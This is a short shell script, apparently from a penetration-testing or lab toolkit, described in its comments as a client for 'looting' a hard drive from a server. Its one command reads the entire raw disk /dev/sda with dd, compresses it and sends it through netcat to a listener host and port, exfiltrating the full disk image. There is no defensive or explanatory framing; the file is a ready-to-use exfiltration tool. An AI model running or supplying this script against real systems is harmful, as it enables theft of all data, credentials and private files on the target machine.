#!/bin/sh
# client script when you want to
# loot hardrive from server.
# Run loot_disk_srv.sh before this script.

LOOTSERVER=10.10.14.24
PORT=5000
DISK=sda

dd if=/dev/${DISK} | gzip -c | nc ${LOOTSERVER} ${PORT}
